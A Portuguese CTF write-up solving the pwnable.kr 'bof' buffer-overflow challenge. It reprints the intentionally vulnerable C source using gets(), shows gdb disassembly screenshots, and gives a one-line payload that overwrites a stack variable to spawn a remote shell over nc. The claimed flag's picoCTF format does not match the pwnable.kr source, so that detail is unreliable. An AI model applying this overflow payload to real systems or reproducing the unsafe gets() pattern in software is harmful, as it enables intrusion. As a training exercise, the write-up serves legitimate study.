# bof
###### Resolvido por @Menegaldo
> Este é um CTF sobre [Buffer Overflow]  

## Sobre o Desafio  

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Running at : nc pwnable.kr 9000

## 🔗 Links do Desafio

- [Exercício](https://pwnable.kr/play.php)
- [Download](http://pwnable.kr/bin/bof)  
- [Download](http://pwnable.kr/bin/bof.c)  

## Solução

```c++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

permissão de execução
```
chmod +x bof
```
rodar o arquivo
```
./bof
```

usando o `gdb bof`

![image](https://github.com/user-attachments/assets/5b512de4-7913-422a-b98c-7cd8de8763f8)

![image](https://github.com/user-attachments/assets/65f5b85a-fead-47d0-86ec-a960541f9e53)

(gdb) disas <função_analisada>

![image](https://github.com/user-attachments/assets/825153ba-a22c-4098-80a4-32a08527067d)

![image](https://github.com/user-attachments/assets/56d511d8-946a-4f09-a892-322d0b9b83e1)

![image](https://github.com/user-attachments/assets/1ae2097a-81c9-464a-b5cc-b145bc0da2f6)

![image](https://github.com/user-attachments/assets/7c85f508-dec2-4a84-8b9b-7652f7c3a3ed)

![image](https://github.com/user-attachments/assets/1926e179-6b1c-4d30-a5fc-a9723f19c80e)

```(python -c "print '\x41'*52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000```

cat flag

> Assim, obtemos a flag `picoCTF{daddy, I just pwned a buFFer :)}`  

